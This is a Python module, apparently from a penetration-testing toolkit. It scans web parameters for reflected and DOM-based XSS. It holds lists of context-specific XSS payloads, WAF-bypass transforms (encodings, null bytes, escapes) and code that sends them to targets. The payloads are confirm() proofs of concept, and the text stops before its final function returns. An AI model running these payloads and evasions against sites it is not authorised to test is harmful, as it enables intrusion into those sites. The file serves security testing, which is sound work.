# modules/xss_scanner.py
from __future__ import annotations
import asyncio
import hashlib
import json
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import httpx
from bs4 import BeautifulSoup

from config.settings import HTTP_TIMEOUT, HTTP_VERIFY_SSL, MAX_THREADS, OUTPUT_DIR
from core.logger import get_logger, section
from core.sanitize import safe_filename
from modules.host_probe import ProbeResult
from modules.param_discovery import ParamScanResult

log = get_logger()

OUTPUT_PATH = Path(OUTPUT_DIR) / "xss"

# CONSTANTS

XSS_CONCURRENCY: int       = min(MAX_THREADS, 12)
XSS_REQUEST_TIMEOUT: float = float(HTTP_TIMEOUT)
MAX_RETRIES: int           = 3
RETRY_BACKOFF_BASE: float  = 1.5   # seconds — exponential base
CANARY_PREFIX: str         = "PHNTM"

# Max payloads fired per parameter (context-expanded + WAF variants)
# Keeps scan time bounded on large targets
MAX_PAYLOADS_PER_PARAM: int = 60

# DOM XSS: min number of lines between source and sink to count as suspicious
# Source and sink on same line = likely same expression, not a real flow
DOM_MIN_LINE_DISTANCE: int = 0   # 0 = report all; increase to reduce noise
DOM_CONFIDENCE_THRESHOLD: int = 2  # min score to report a DOM finding


# ENUMERATIONS

class XSSContext(str, Enum):
    HTML_TEXT = "html_text"
    HTML_ATTR_DQ = "html_attr_dq"   # value="INJECT"
    HTML_ATTR_SQ = "html_attr_sq"   # value='INJECT'
    HTML_ATTR_UQ = "html_attr_uq"   # value=INJECT
    JS_STRING_SQ = "js_string_sq"   # var x = 'INJECT'
    JS_STRING_DQ = "js_string_dq"   # var x = "INJECT"
    JS_TEMPLATE = "js_template"    # var x = `INJECT`
    JS_BARE = "js_bare"        # var x = INJECT
    SCRIPT_BLOCK = "script_block"   # <script>INJECT</script>
    URL_HREF = "url_href"       # href="INJECT"
    UNKNOWN = "unknown"


class XSSSeverity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


# CSP PARSER

@dataclass(frozen=True)
class CSPStrength:
    """Parsed CSP strength rating for severity downgrade decisions."""
    has_csp: bool
    blocks_inline: bool
    blocks_eval: bool
    has_nonce: bool
    has_strict: bool   # strict-dynamic present

    @property
    def is_strong(self) -> bool:
        """Strong CSP = inline blocked + eval blocked + no wildcard sources."""
        return self.blocks_inline and self.blocks_eval

    @property
    def is_bypassable(self) -> bool:
        return not self.has_csp or not self.blocks_inline


def _parse_csp(headers: dict[str, str]) -> CSPStrength:
    """
    Parses Content-Security-Policy header into a CSPStrength rating.
    Handles both CSP and CSP-Report-Only headers.
    """
    csp_value = (
        headers.get("content-security-policy", "") or
        headers.get("content-security-policy-report-only", "")
    ).lower()

    if not csp_value:
        return CSPStrength(
            has_csp=False,
            blocks_inline=False,
            blocks_eval=False,
            has_nonce=False,
            has_strict=False,
        )

    return CSPStrength(
        has_csp=True,
        blocks_inline="unsafe-inline" not in csp_value,
        blocks_eval="unsafe-eval" not in csp_value,
        has_nonce="nonce-" in csp_value,
        has_strict="strict-dynamic" in csp_value,
    )


def _apply_csp_severity(
    base_severity: XSSSeverity,
    csp: CSPStrength,
) -> XSSSeverity:
    """Downgrades severity based on CSP strength."""
    if not csp.has_csp:
        return XSSSeverity.CRITICAL if base_severity == XSSSeverity.HIGH else base_severity

    if csp.is_strong:
        # Strong CSP → confirmed XSS becomes LOW (still reportable, still valuable)
        if base_severity in (XSSSeverity.CRITICAL, XSSSeverity.HIGH):
            return XSSSeverity.LOW
        return XSSSeverity.INFO

    if csp.blocks_inline and not csp.blocks_eval:
        # Partial CSP
        if base_severity == XSSSeverity.CRITICAL:
            return XSSSeverity.HIGH

    return base_severity


# PAYLOAD ENGINE

# Context-specific base payloads
# {C} = canary placeholder, replaced at runtime with unique marker
_BASE_PAYLOADS: dict[XSSContext, list[str]] = {

    XSSContext.HTML_TEXT: [
        "<{C}>",
        "<img src=x onerror=confirm({C})>",
        "<svg onload=confirm({C})>",
        "<svg/onload=confirm({C})>",
        "<details open ontoggle=confirm({C})>",
        "<video src=1 onerror=confirm({C})>",
        "<iframe srcdoc='<script>confirm({C})</script>'>",
        "<math><mtext></table><img src=x onerror=confirm({C})>",
        "<!--<img src=--><img src=x onerror=confirm({C})>",
        
        # Modern/stealthy — works in stricter contexts
        "<object data='javascript:confirm({C})'>",
        "<svg><animate onbegin=confirm({C}) attributeName=x dur=1s>",
        
        # Polyglot 1 — works in HTML text, attr, and some JS contexts
        "';confirm({C})//\";<img src=x onerror=confirm({C})><!--",
    ],

    XSSContext.HTML_ATTR_DQ: [
        '"{C}',
        '" onmouseover="confirm({C})',
        '" autofocus onfocus="confirm({C})',
        '" onerror="confirm({C})" src="x',
        '"><img src=x onerror=confirm({C})>',
        '" tabindex=1 onfocus=confirm({C}) autofocus x="',
        '" style="animation-name:rotation" onanimationstart="confirm({C})',
        
        # Polyglot 2 — attr + text context
        '"><svg onload=confirm({C})><!--',
    ],

    XSSContext.HTML_ATTR_SQ: [
        "'{C}",
        "' onmouseover='confirm({C})",
        "' autofocus onfocus='confirm({C})",
        "'><img src=x onerror=confirm({C})>",
    ],

    XSSContext.HTML_ATTR_UQ: [
        "{C}",
        "x onmouseover=confirm({C})",
        "x/><svg onload=confirm({C})>",
        "x autofocus onfocus=confirm({C})",
    ],

    XSSContext.JS_STRING_SQ: [
        "'-confirm({C})-'",
        "';confirm({C})//",
        r"\'confirm({C})//",
        "'+confirm({C})+'",
        "\\';confirm({C})//",
        "\\\\';confirm({C})//",
    ],

    XSSContext.JS_STRING_DQ: [
        '"-confirm({C})-"',
        '";confirm({C})//',
        r'\"confirm({C})//',
        '"+confirm({C})+"',
        '\\\";confirm({C})//',
    ],

    XSSContext.JS_TEMPLATE: [
        "`${confirm({C})}",
        "`-confirm({C})-`",
        "`; confirm({C})//",
        "${confirm({C})}",
    ],

    XSSContext.JS_BARE: [
        "confirm({C})",
        ";confirm({C})//",
        "1;confirm({C})",
        
        # Optional chaining — bypasses some filters checking for ()
        "confirm?.({C})",
        
        # import() — works where confirm is blocked
        "import('data:text/javascript,confirm({C})')",
    ],

    XSSContext.SCRIPT_BLOCK: [
        "confirm({C})",
        "</script><script>confirm({C})</script>",
        "</script><img src=x onerror=confirm({C})>",
        # Polyglot 3 — breaks out of script + works in HTML
        "</script><svg onload=confirm({C})><!--<script>",
    ],

    XSSContext.URL_HREF: [
        "javascript:confirm({C})",
        "javascript://comment%0aconfirm({C})",
        "data:text/html,<script>confirm({C})</script>",
        "vbscript:confirm({C})"
    ],

    XSSContext.UNKNOWN: [
        "<{C}>",
        '"{C}"',
        "'{C}'",
        "<img src=x onerror=confirm({C})>",
        "<svg onload=confirm({C})>",
        "javascript:confirm({C})",
        
        # Polyglot — covers HTML/attr/JS in one shot
        "';confirm({C})//\";<img src=x onerror=confirm({C})><!--",
    ],
}

# Priority context ordering for multi-probe strategy
# We always test payloads from these contexts regardless of detected context
_PRIORITY_CONTEXTS: tuple[XSSContext, ...] = (
    XSSContext.HTML_TEXT,
    XSSContext.HTML_ATTR_DQ,
    XSSContext.JS_STRING_SQ,
    XSSContext.JS_STRING_DQ,
    XSSContext.JS_BARE,
    XSSContext.SCRIPT_BLOCK,
)

# How many payloads to take from each non-primary context
_SECONDARY_PAYLOAD_SAMPLE: int = 3


def _build_payload_union(primary_context: XSSContext) -> list[str]:
    """
    Builds the full payload list to test for a parameter.
    Strategy:
    1. All payloads from the detected primary context
    2. Top N payloads from each priority context not already included
    3. Deduplicated, capped at MAX_PAYLOADS_PER_PARAM
    """
    seen: set[str] = set()
    result: list[str] = []

    def _add(payload: str) -> None:
        if payload not in seen and len(result) < MAX_PAYLOADS_PER_PARAM:
            seen.add(payload)
            result.append(payload)

    # Primary context first — all payloads
    for p in _BASE_PAYLOADS.get(primary_context, []):
        _add(p)

    # Secondary contexts — sample
    for ctx in _PRIORITY_CONTEXTS:
        if ctx == primary_context:
            continue
        for p in _BASE_PAYLOADS.get(ctx, [])[:_SECONDARY_PAYLOAD_SAMPLE]:
            _add(p)

    return result


# WAF BYPASS ENGINE 
def _apply_waf_bypasses(payload: str) -> list[str]:
    """
    Applies 11 real 2025-era WAF bypass transforms to a payload.
    Returns list of variant payloads.
    Only applicable transforms are returned — some transforms
    only make sense for HTML payloads, others for JS.
    """
    variants: list[str] = [payload]

    has_tag = "<" in payload and ">" in payload
    has_event  = "=" in payload and any(
        e in payload.lower()
        for e in ("onerror", "onload", "onfocus", "onmouseover", "ontoggle")
    )
    has_js_call = "confirm(" in payload or "alert(" in payload

    # 1. Case variation on event handlers
    if has_event:
        def _randomize_case(s: str) -> str:
            return "".join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(s)
            )
        for event in ("onerror", "onload", "onfocus", "onmouseover", "ontoggle", "onanimationstart"):
            if event in payload.lower():
                variants.append(payload.replace(event, _randomize_case(event)))
                break

    # 2. URL encoding of angle brackets
    if has_tag:
        variants.append(
            payload.replace("<", "%3C").replace(">", "%3E")
        )

    # 3. Double URL encoding
    if has_tag:
        variants.append(
            payload.replace("<", "%253C").replace(">", "%253E")
        )

    # 4. HTML entity encoding of angle brackets
    if has_tag:
        variants.append(
            payload.replace("<", "&lt;").replace(">", "&gt;")
        )

    # 5. Null byte injection (bypasses some regex WAFs)
    if has_tag:
        variants.append(payload.replace("<", "<\x00"))

    # 6. Tab/newline injection in tag
    # Only replace space-before-event-handler, not all " on" occurrences
    # Guard: only apply if replacement preserves the event= structure
    if has_tag and has_event:
        tab_variant   = re.sub(r" (on\w+=)", r"\t\1", payload)
        newline_variant = re.sub(r" (on\w+=)", r"\n\1", payload)
        if tab_variant != payload:
            variants.append(tab_variant)
        if newline_variant != payload:
            variants.append(newline_variant)

    # 7. String concatenation to break JS keyword detection
    if has_js_call:
        variants.append(
            payload.replace("confirm(", 'co"+"nfirm(')
        )

    # 8. Optional chaining — bypasses filters looking for ()
    if has_js_call:
        variants.append(
            payload.replace("confirm(", "confirm?.(")
        )

    # 9. Unicode escape for function name
    if has_js_call:
        variants.append(
            payload.replace("confirm", "\\u0063onfirm")
        )

    # 10. Hex escape for function name
    if has_js_call:
        variants.append(
            payload.replace("confirm", "\\x63onfirm")
        )

    # 11. SVG/namespace trick — bypasses HTML sanitizers that don't handle SVG NS
    if "<svg" in payload.lower():
        variants.append(
            payload.replace("<svg", "<svg xmlns='http://www.w3.org/2000/svg'")
        )

    # Deduplicate preserving order, skip variants identical to original
    seen: set[str] = {payload}
    unique: list[str] = [payload]
    for v in variants[1:]:
        if v not in seen:
            seen.add(v)
            unique.append(v)

    return unique



# MULTI-PROBE CONTEXT DETECTOR
_CONTEXT_PROBES: tuple[str, ...] = (
    "PROBE1PHNTM",    # Plain alphanumeric — minimal encoding
    '"PROBE2PHNTM"',  # Double-quoted — detects attr context
    "'PROBE3PHNTM'",  # Single-quoted — detects attr/JS context
)


def _detect_all_contexts(
    response_bodies: list[str],
    probe_values: list[str],
) -> set[XSSContext]:
    """
    Runs multi-probe context detection.
    Each probe has a different style (plain, quoted, etc).
    Returns the union of all detected contexts across all probes.
    This replaces the single-probe approach that missed multi-context params.
    """
    detected: set[XSSContext] = set()

    for body, probe in zip(response_bodies, probe_values, strict=False):
        # Normalize JSON-encoded probe values before context detection
        _probe_normalized = probe.strip('"\'')  # strip surrounding quotes from probe styles
        _body_check = body

        # Handle JSON responses — probe may be value in JSON string
        if body.strip().startswith(("{", "[")):
            try:
                import json as _json
                _parsed = _json.loads(body)
                _flat = _json.dumps(_parsed)
                if _probe_normalized in _flat:
                    _body_check = _flat
            except (ValueError, TypeError):
                pass

        if probe not in _body_check and _probe_normalized not in _body_check:
            continue
        body = _body_check  # use normalized for context detection below
        soup = BeautifulSoup(body, "html.parser")

        # Script block context
        for script in soup.find_all("script"):
            if script.string and probe in script.string:
                content = script.string
                idx     = content.find(probe)
                before  = content[max(0, idx - 40):idx]
                semi_idx = before.rfind(";")
                context_slice = before[semi_idx + 1:] if semi_idx != -1 else before

                if "'" in context_slice:
                    detected.add(XSSContext.JS_STRING_SQ)
                elif '"' in context_slice:
                    detected.add(XSSContext.JS_STRING_DQ)
                elif "`" in before:
                    detected.add(XSSContext.JS_TEMPLATE)
                else:
                    detected.add(XSSContext.JS_BARE)

        # HTML attribute context
        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                val = " ".join(attr_value) if isinstance(attr_value, list) else str(attr_value)
                if probe not in val:
                    continue
                if attr_name in ("href", "src", "action", "formaction", "data"):
                    detected.add(XSSContext.URL_HREF)
                elif f'"{probe}"' in body:
                    detected.add(XSSContext.HTML_ATTR_DQ)
                elif f"'{probe}'" in body:
                    detected.add(XSSContext.HTML_ATTR_SQ)
                else:
                    detected.add(XSSContext.HTML_ATTR_UQ)

        # Unquoted attribute (raw regex — BS4 normalizes quotes)
        if re.search(rf"=\s*{re.escape(probe)}[\s>]", body):
            detected.add(XSSContext.HTML_ATTR_UQ)

        # HTML text node — if none of the above matched, it's text
        if probe in body and not detected:
            detected.add(XSSContext.HTML_TEXT)

    return detected if detected else {XSSContext.UNKNOWN}


# REFLECTION ANALYZER

def _analyze_reflection(
    response_body: str,
    response_headers: dict[str, str],
    canary: str,
    payload: str,
    contexts: set[XSSContext],
) -> tuple[bool, XSSSeverity, str]:
    """
    Determines if a payload reflected in an executable context.
    Returns (is_confirmed, severity, evidence_snippet).

    Confirmed = canary present unencoded + executable context + CSP allows exec.
    """
    # Normalize encoded variants before checking presence
    _normalized = (
        response_body
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&#x3C;", "<")
        .replace("&#x3E;", ">")
        .replace("%3C", "<")
        .replace("%3E", ">")
    )
    if canary not in response_body and canary not in _normalized:
        return False, XSSSeverity.INFO, ""

    # Use whichever body contains the canary for evidence extraction
    _body_for_analysis = response_body if canary in response_body else _normalized

    idx = _body_for_analysis.find(canary)
    start = max(0, idx - 80)
    end = min(len(_body_for_analysis), idx + 150)
    evidence = _body_for_analysis[start:end].strip()

    csp = _parse_csp(response_headers)

    # Check for entity encoding — WAF/framework sanitized it
    # Only downgrade if canary is ONLY present in encoded form, never raw
    canary_raw_present = canary in response_body
    canary_encoded_present = (
        canary.replace("<", "&lt;") in response_body
        or canary.replace(">", "&gt;") in response_body
        or canary.replace("<", "&#x3C;") in response_body
    )
    if canary_encoded_present and not canary_raw_present:
        return False, XSSSeverity.LOW, evidence

    # Executable JS contexts = confirmed if canary unencoded
    js_contexts = {
        XSSContext.JS_STRING_SQ,
        XSSContext.JS_STRING_DQ,
        XSSContext.JS_TEMPLATE,
        XSSContext.JS_BARE,
        XSSContext.SCRIPT_BLOCK,
    }
    if contexts & js_contexts:
        base = XSSSeverity.HIGH
        return True, _apply_csp_severity(base, csp), evidence

    # HTML context with executable event handler in response
    html_contexts = {
        XSSContext.HTML_TEXT,
        XSSContext.HTML_ATTR_DQ,
        XSSContext.HTML_ATTR_SQ,
        XSSContext.HTML_ATTR_UQ,
    }
    if contexts & html_contexts:
        event_handlers = (
            "onerror=", "onload=", "onfocus=", "onmouseover=",
            "ontoggle=", "onanimationstart=", "onbegin=",
        )
        if any(h in response_body[start:end].lower() for h in event_handlers):
            base = XSSSeverity.HIGH
            return True, _apply_csp_severity(base, csp), evidence

        # Angle brackets reflected unencoded = MEDIUM (manual verification)
        if "<" in payload and "<" in response_body[start:end]:
            return False, XSSSeverity.MEDIUM, evidence

    return False, XSSSeverity.LOW, evidence


# DOM XSS ANALYZER

# Sinks with severity weights
_DOM_SINKS: dict[str, int] = {
    r"document\.write\s*\(":           3,
    r"\.innerHTML\s*=":                3,
    r"\.outerHTML\s*=":                3,
    r"\.insertAdjacentHTML\s*\(":      3,
    r"eval\s*\(":                      3,
    r"new\s+Function\s*\(":           3,
    r"setTimeout\s*\(\s*['\"`]":       2,
    r"setInterval\s*\(\s*['\"`]":      2,
    r"location\.href\s*=":             2,
    r"location\.replace\s*\(":        2,
    r"location\.assign\s*\(":         2,
    r"window\.location\s*=":           2,
    r"\.src\s*=":                      1,
    r"document\.location\s*=":        2,
}

# Sources with severity weights
_DOM_SOURCES: dict[str, int] = {
    r"location\.search":    3,
    r"location\.hash":      3,
    r"location\.href":      2,
    r"document\.referrer":  2,
    r"document\.URL":       2,
    r"document\.cookie":    2,
    r"window\.name":        2,
    r"URLSearchParams":     2,
    r"decodeURIComponent":  1,
}

# Sanitizer patterns — if present near a sink, reduce confidence
_SANITIZERS: tuple[re.Pattern, ...] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"DOMPurify\.sanitize",
        r"sanitize\s*\(",
        r"escapeHtml\s*\(",
        r"htmlEncode\s*\(",
        r"encodeURIComponent\s*\(",
        r"textContent\s*=",  # textContent is safe — if used instead of innerHTML
    )
)


@dataclass
class DOMFinding:
    js_url:     str
    sink:       str
    source:     str
    confidence: int
    context:    str

    def to_dict(self) -> dict:
        return {
            "js_url":     self.js_url,
            "sink":       self.sink,
            "source":     self.source,
            "confidence": self.confidence,
            "context":    self.context[:400],
        }


def _analyze_dom_xss(js_url: str, content: str) -> list[DOMFinding]:
    """
    Confidence-scored DOM XSS detection.
    Requires: source found + sink found + proximity check + no sanitizer nearby.
    Score threshold filters low-confidence noise.
    """
    findings: list[DOMFinding] = []
    lines     = content.split("\n")

    # Find all source line numbers
    source_lines: dict[str, list[int]] = {}
    for source_pat, source_weight in _DOM_SOURCES.items():
        compiled = re.compile(source_pat, re.IGNORECASE)
        matched = [i for i, line in enumerate(lines) if compiled.search(line)]
        if matched:
            source_lines[source_pat] = matched

    if not source_lines:
        return findings  # No sources → no DOM XSS possible

    # Find all sink locations and score them
    for sink_pat, sink_weight in _DOM_SINKS.items():
        sink_compiled = re.compile(sink_pat, re.IGNORECASE)

        for sink_idx, line in enumerate(lines):
            if not sink_compiled.search(line):
                continue

            # Check for sanitizer within 5 lines of sink
            nearby_start = max(0, sink_idx - 5)
            nearby_end   = min(len(lines), sink_idx + 5)
            nearby_code  = "\n".join(lines[nearby_start:nearby_end])

            sanitizer_present = any(
                san.search(nearby_code) for san in _SANITIZERS
            )
            if sanitizer_present:
                continue

            # Find closest source and compute confidence
            for source_pat, source_line_nums in source_lines.items():
                for source_idx in source_line_nums:
                    distance = abs(sink_idx - source_idx)

                    # Confidence = sink_weight + source_weight - proximity penalty
                    # Closer source to sink = higher confidence
                    proximity_bonus = max(0, 5 - min(distance, 5))
                    confidence      = sink_weight + _DOM_SOURCES[source_pat] + proximity_bonus

                    if confidence < DOM_CONFIDENCE_THRESHOLD:
                        continue

                    # Extract context window around the sink
                    ctx_start  = max(0, sink_idx - 3)
                    ctx_end    = min(len(lines), sink_idx + 4)
                    ctx_snippet = "\n".join(lines[ctx_start:ctx_end]).strip()

                    findings.append(DOMFinding(
                        js_url=js_url,
                        sink=sink_pat,
                        source=source_pat,
                        confidence=confidence,
                        context=ctx_snippet,
                    ))
                    break  # One finding per sink location

    # Deduplicate by sink location + source pattern
    seen: set[tuple[str, str, str]] = set()
    unique: list[DOMFinding] = []
    for f in findings:
        key = (f.js_url, f.sink, f.source)
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return sorted(unique, key=lambda f: f.confidence, reverse=True)


# DATA MODELS
@dataclass
class XSSFinding:
    url:          str
    parameter:    str
    method:       str
    payload:      str
    contexts:     set[XSSContext]
    severity:     XSSSeverity
    evidence:     str
    canary:       str
    is_confirmed: bool
    csp_present:  bool

    def to_dict(self) -> dict:
        return {
            "url":          self.url,
            "parameter":    self.parameter,
            "method":       self.method,
            "payload":      self.payload,
            "contexts":     [c.value for c in self.contexts],
            "severity":     self.severity.value,
            "evidence":     self.evidence[:500],
            "canary":       self.canary,
            "is_confirmed": self.is_confirmed,
            "csp_present":  self.csp_present,
        }


@dataclass
class XSSScanResult:
    target:       str
    findings:     list[XSSFinding] = field(default_factory=list)
    dom_findings: list[DOMFinding] = field(default_factory=list)

    @property
    def confirmed_count(self) -> int:
        return sum(1 for f in self.findings if f.is_confirmed)

    @property
    def high_and_above(self) -> list[XSSFinding]:
        return [
            f for f in self.findings
            if f.severity in (XSSSeverity.CRITICAL, XSSSeverity.HIGH)
        ]

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "confirmed": self.confirmed_count,
            "high_and_above": len(self.high_and_above),
            "dom_findings": len(self.dom_findings),
            "findings": [f.to_dict() for f in self.findings],
            "dom_findings_detail": [d.to_dict() for d in self.dom_findings],
        }


# CANARY GENERATOR
def _make_canary(url: str, param: str, index: int) -> str:
    """Deterministic unique canary per url+param+index. 8-char hex suffix."""
    raw = f"{url}:{param}:{index}"
    digest = hashlib.sha256(raw.encode()).hexdigest()[:8].upper()
    return f"{CANARY_PREFIX}{digest}"


# HTTP INJECTOR WITH RETRY

async def _inject(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    method: str,
    value: str,
    base_params: dict[str, list[str]],
    content_type: str = "form",
) -> httpx.Response | None:
    """
    Injects value into param via GET or POST.
    POST supports three content types: form, json, multipart.
    Includes exponential backoff retry on transient errors and 429s.
    """
    merged = {k: v[0] if v else "" for k, v in base_params.items()}
    merged[param] = value

    for attempt in range(MAX_RETRIES):
        try:
            if method.upper() == "GET":
                parsed  = urlparse(url)
                new_url = parsed._replace(query=urlencode(merged)).geturl()
                resp    = await client.get(new_url)
            elif content_type == "json":
                resp = await client.post(
                    url,
                    json=merged,
                    headers={"Content-Type": "application/json"},
                )
            elif content_type == "multipart":
                resp = await client.post(url, files={k: (None, v) for k, v in merged.items()})
            else:
                resp = await client.post(url, data=merged)

            if resp.status_code == 429:
                wait = RETRY_BACKOFF_BASE ** attempt
                log.warning(f"[XSS] 429 rate-limited on {url} — backing off {wait:.1f}s")
                await asyncio.sleep(wait)
                continue

            return resp

        except httpx.TimeoutException:
            if attempt < MAX_RETRIES - 1:
                await asyncio.sleep(RETRY_BACKOFF_BASE ** attempt)
            else:
                log.warning(f"[XSS] Timeout after {MAX_RETRIES} attempts: {url}")
                return None
        except httpx.RequestError as exc:
            log.warning(f"[XSS] Request error {url}: {type(exc).__name__}")
            return None

    return None


# CONTENT TYPE DETECTOR

def _detect_post_content_type(url: str, base_params: dict[str, list[str]]) -> str:
    """
    Heuristic: detect what content type a POST endpoint likely expects.
    Checks URL path for API indicators → json.
    Falls back to form.
    """
    path = urlparse(url).path.lower()
    if any(seg in path for seg in ("/api/", "/v1/", "/v2/", "/graphql", "/rest/")):
        return "json"
    return "form"


# SINGLE PARAMETER TESTER

async def _test_parameter(
    client:      httpx.AsyncClient,
    url:         str,
    param:       str,
    method:      str,
    base_params: dict[str, list[str]],
    sem:         asyncio.Semaphore,
) -> list[XSSFinding]:
    """
    Tests a single parameter for XSS.

    Phase 1: Multi-probe context detection (3 probes, different styles).
    Phase 2: Build payload union from all detected contexts + priority contexts.
    Phase 3: Apply WAF bypass transforms.
    Phase 4: Fire payloads, analyze reflection, stop on first confirmed hit.
    """
    async with sem:
        # Phase 1: Multi-probe context detection
        probe_responses: list[str] = []
        post_ctype = _detect_post_content_type(url, base_params)

        for probe_value in _CONTEXT_PROBES:
            resp = await _inject(
                client, url, param, method, probe_value, base_params, post_ctype
            )
            probe_responses.append(resp.text if resp else "")

        detected_contexts = _detect_all_contexts(probe_responses, list(_CONTEXT_PROBES))
        log.info(
            f"[XSS] {param}@{urlparse(url).path} → "
            f"contexts={[c.value for c in detected_contexts]}"
        )

        # Phase 2: Build unified payload list
        # Use the first detected context as primary; others supplement
        primary = next(iter(detected_contexts), XSSContext.UNKNOWN)
        base_payloads = _build_payload_union(primary)

        # Phase 3: Expand with WAF bypass variants
        all_payloads: list[str] = []
        for bp in base_payloads:
            bypasses = _apply_waf_bypasses(bp)
            all_payloads.extend(bypasses)
            if len(all_payloads) >= MAX_PAYLOADS_PER_PARAM:
                break
        all_payloads = all_payloads[:MAX_PAYLOADS_PER_PARAM]

        # Phase 4: Fire and analyze
        findings: list[XSSFinding] = []

        for idx, payload_template in enumerate(all_payloads):
            canary  = _make_canary(url, param, idx)
            payload = payload_template.replace("{C}", canary)

            resp = await _inject(
                client, url, param, method, payload, base_params, post_ctype
            )
            if resp is None:
                continue

            headers = {k.lower(): v for k, v in resp.headers.items()}
            csp = _parse_csp(headers)

            is_confirmed, severity, evidence = _analyze_reflection(
                resp.text, headers, canary, payload, detected_contexts
            )

            if severity == XSSSeverity.INFO:
                continue

            finding = XSSFinding(
                url=url,
                parameter=param,
                method=method,
                payload=payload,
                contexts=detected_contexts,
                severity=severity,
                evidence=evidence,
                canary=canary,
                is_confirmed=is_confirmed,
                csp_present=csp.has_csp,
            )
            findings.append(finding)

            if is_confirmed:
                log.warning(
                    f"[XSS] ★ CONFIRMED [{severity.value}] "
                    f"?{param} — {url}\n"
                    f"      Payload : {payload[:100]}\n"
                    f"      Contexts: {[c.value for c in detected_contexts]}\n"
                    f"      CSP     : {'present' if csp.has_csp else 'absent'}"
                )
                break  # Confirmed = stop testing this param

    return findings


# DOM XSS HOST ANALYZER

async def _analyze_host_dom(
    client:   httpx.AsyncClient,
    host_url: str,
    sem:      asyncio.Semaphore,
) -> list[DOMFinding]:
    """
    Fetches page, extracts inline scripts and external JS files,
    runs confidence-scored DOM XSS analysis on each.
    """
    dom_findings: list[DOMFinding] = []

    async with sem:
        try:
            resp = await client.get(host_url)
        except (httpx.TimeoutException, httpx.RequestError):
            return dom_findings

    if resp.status_code != 200:
        return dom_findings

    soup = BeautifulSoup(resp.text, "html.parser")

    for script in soup.find_all("script"):
        src     = script.get("src")
        content: str = ""
        js_url: str  = host_url

        if src:
            if isinstance(src, list):
                src_value = " ".join(str(part) for part in src)
            else:
                src_value = str(src)
            js_url = urljoin(host_url, src_value)
            async with sem:
                try:
                    js_resp = await client.get(js_url)
                    if js_resp.status_code == 200:
                        content = js_resp.text
                except (httpx.TimeoutException, httpx.RequestError):
                    continue
        elif script.string:
            content = script.string

        if content:
            findings = _analyze_dom_xss(js_url, content)
            dom_findings.extend(findings)
            if findings:
                log.info(
                    f"[XSS/DOM] {js_url.split('/')[-1]}: "
                    f"{len(findings)} finding(s), "
                    f"top confidence={findings[0].confidence}"
                )

    return dom_findings


# TEST TARGET BUILDER

def _build_test_targets(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> list[tuple[str, str, str, dict[str, list[str]]]]:
    """
    Builds deduplicated list of (url, param, method, base_params).
    Sources: Arjun results (Step 13) + live host query params.
    """
    targets: list[tuple[str, str, str, dict[str, list[str]]]] = []
    seen:    set[str] = set()

    def _add(url: str, param: str, method: str, base: dict[str, list[str]]) -> None:
        key = f"{url}:{param}:{method}"
        if key not in seen:
            seen.add(key)
            targets.append((url, param, method, base))

    for url_result in param_result.url_results:
        parsed     = urlparse(url_result.url)
        base_params = parse_qs(parsed.query, keep_blank_values=True)
        for param in url_result.params:
            _add(url_result.url, param.param_name, param.method, base_params)

    for host in probe_result.live_hosts:
        parsed      = urlparse(host.url)
        base_params = parse_qs(parsed.query, keep_blank_values=True)
        for param in base_params:
            _add(host.url, param, "GET", base_params)

    return targets


# SAVE RESULTS

def _save_results(result: XSSScanResult) -> Path:
    OUTPUT_PATH.mkdir(parents=True, exist_ok=True)
    safe_name   = safe_filename(result.target)
    output_file = OUTPUT_PATH / f"{safe_name}_xss.json"

    with output_file.open("w", encoding="utf-8") as f:
        json.dump(result.to_dict(), f, indent=2)

    log.info(f"[XSS] Results saved → {output_file}")
    return output_file


# ASYNC ORCHESTRATOR

async def _run_xss_scan(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> XSSScanResult:
    result = XSSScanResult(target=probe_result.target)
    sem    = asyncio.Semaphore(XSS_CONCURRENCY)

    timeout = httpx.Timeout(
        connect=5.0,
        read=XSS_REQUEST_TIMEOUT,
        write=5.0,
        pool=5.0,
    )

    async with httpx.AsyncClient(
        timeout=timeout,
        verify=HTTP_VERIFY_SSL,
        follow_redirects=True,
        headers={"User-Agent": "Mozilla/5.0 (compatible; PHANTOM-Scanner/1.0)"},
    ) as client:

        # Parameter injection
        test_targets = _build_test_targets(probe_result, param_result)

        if not test_targets:
            log.warning("[XSS] No parameters to test — skipping injection phase")
        else:
            log.info(f"[XSS] Testing {len(test_targets)} parameter(s)")
            injection_tasks = [
                _test_parameter(client, url, param, method, base_params, sem)
                for url, param, method, base_params in test_targets
            ]
            all_findings = await asyncio.gather(
                *injection_tasks, return_exceptions=True
            )
            for findings in all_findings:
                if isinstance(findings, BaseException):
                    log.warning(
                        f"[XSS] Injection worker failed: "
                        f"{type(findings).__name__}: {findings}"
                    )
                    continue
                result.findings.extend(findings)

        # DOM XSS analysis
        log.info(f"[XSS] DOM analysis on {len(probe_result.live_hosts)} host(s)")
        dom_tasks = [
            _analyze_host_dom(client, host.url, sem)
            for host in probe_result.live_hosts
        ]
        all_dom = await asyncio.gather(
            *dom_tasks, return_exceptions=True
        )
        for dom_list in all_dom:
            if isinstance(dom_list, BaseException):
                log.warning(
                    f"[XSS] DOM worker failed: "
                    f"{type(dom_list).__name__}: {dom_list}"
                )
                continue
            result.dom_findings.extend(dom_list)

    return result


# MAIN ENTRY POINT
def scan_xss(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> XSSScanResult:
    """
    Elite XSS scanner — reflected (context-aware, multi-probe, WAF-bypass)
    + DOM-based (confidence-scored, sanitizer-aware).
    Takes ProbeResult (Step 7) + ParamScanResult (Step 13).
    Returns XSSScanResult.
    """
    section(f"XSS Scanner → {probe_result.target}")

    if not probe_result.live_hosts:
        log.warning("[XSS] No live hosts — skipping")
        return XSSScanResult(target=probe_result.target)

    result = asyncio.run(_run_xss_scan(probe_result, param_result))

